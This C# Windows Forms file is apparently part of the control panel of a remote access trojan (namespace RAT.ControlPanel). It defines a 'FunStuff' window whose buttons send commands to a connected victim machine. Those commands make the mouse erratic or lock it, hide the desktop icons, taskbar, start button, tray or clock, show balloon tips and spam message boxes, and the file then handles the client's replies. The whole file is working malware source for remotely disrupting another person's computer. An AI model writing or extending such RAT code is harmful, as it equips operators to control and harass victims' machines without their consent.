using System;
using System.Drawing;
using System.Windows.Forms;
using System.Threading.Tasks;
using Newtonsoft.Json;
using RAT.Shared.Models;

namespace RAT.ControlPanel.Forms
{
    public partial class frmFunStuff : Form
    {
        private ClientInfo client;
        private MainForm mainForm;
        
        public frmFunStuff(ClientInfo client, MainForm mainForm)
        {
            this.client = client;
            this.mainForm = mainForm;
            InitializeComponent();
            this.Text = $"FunStuff - {client.ClientId}";
            
            // MainForm에 이 폼 등록
            mainForm.RegisterForm(client.ClientId, this);
        }
        
        // ===== Mouse Fun =====
        
        private async void btnCrazyMouse_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "fun_crazy_mouse" });
            ShowStatus("Crazy mouse activated!");
        }
        
        private async void btnLockMouse_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "fun_lock_mouse" });
            ShowStatus("Mouse locked");
        }
        
        private async void btnUnlockMouse_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "fun_unlock_mouse" });
            ShowStatus("Mouse unlocked");
        }
        
        private async void btnMouseTrails_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "fun_mouse_trails" });
            ShowStatus("Mouse trails enabled");
        }
        
        // ===== Keyboard Fun =====
        
        private async void btnKeyboardSmile_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "fun_keyboard_smile" });
            ShowStatus("Keyboard smile activated!");
        }
        
        // ===== UI Fun =====
        
        private async void btnToggleDesktop_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "fun_toggle_desktop" });
            ShowStatus("Desktop icons toggled");
        }
        
        private async void btnToggleTaskbar_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "fun_toggle_taskbar" });
            ShowStatus("Taskbar toggled");
        }
        
        private async void btnToggleStart_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "fun_toggle_start" });
            ShowStatus("Start button toggled");
        }
        
        private async void btnToggleTray_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "fun_toggle_tray" });
            ShowStatus("System tray toggled");
        }
        
        private async void btnToggleClock_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "fun_toggle_clock" });
            ShowStatus("Clock toggled");
        }
        
        // ===== Message Fun =====
        
        private async void btnBalloonTip_Click(object sender, EventArgs e)
        {
            string title = txtBalloonTitle.Text;
            string text = txtBalloonText.Text;
            int duration = (int)numBalloonDuration.Value;
            string icon = comboBalloonIcon.SelectedItem?.ToString() ?? "Info";
            
            if (string.IsNullOrEmpty(title) || string.IsNullOrEmpty(text))
            {
                MessageBox.Show("Enter title and text", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            await SendCommand(new { type = "fun_balloon_tip", duration = duration, title = title, text = text, icon = icon });
            ShowStatus($"Balloon tip sent: {title}");
        }
        
        private async void btnMessageBoxSpam_Click(object sender, EventArgs e)
        {
            string title = txtMsgBoxTitle.Text;
            string text = txtMsgBoxText.Text;
            int count = (int)numMsgBoxCount.Value;
            
            if (string.IsNullOrEmpty(title) || string.IsNullOrEmpty(text))
            {
                MessageBox.Show("Enter title and text", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            if (MessageBox.Show($"Send {count} message boxes?", "Confirm", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                await SendCommand(new { type = "fun_messagebox_spam", title = title, text = text, count = count });
                ShowStatus($"Message box spam sent: {count} boxes");
            }
        }
        
        // ===== Status =====
        
        private void ShowStatus(string message)
        {
            lblStatus.Text = $"{DateTime.Now:HH:mm:ss} - {message}";
        }
        
        // ===== 명령 전송 =====
        
        private async Task SendCommand(object command)
        {
            await mainForm.SendCommand(client, command);
        }
        
        // ===== 응답 처리 =====
        
        public void HandleResponse(dynamic response)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => HandleResponse(response)));
                return;
            }
            
            string type = response.type.ToString();
            bool success = response.success;
            
            if (success)
            {
                ShowStatus($"{type} executed successfully");
            }
            else
            {
                ShowStatus($"{type} failed: {response.message}");
            }
        }
    }
}
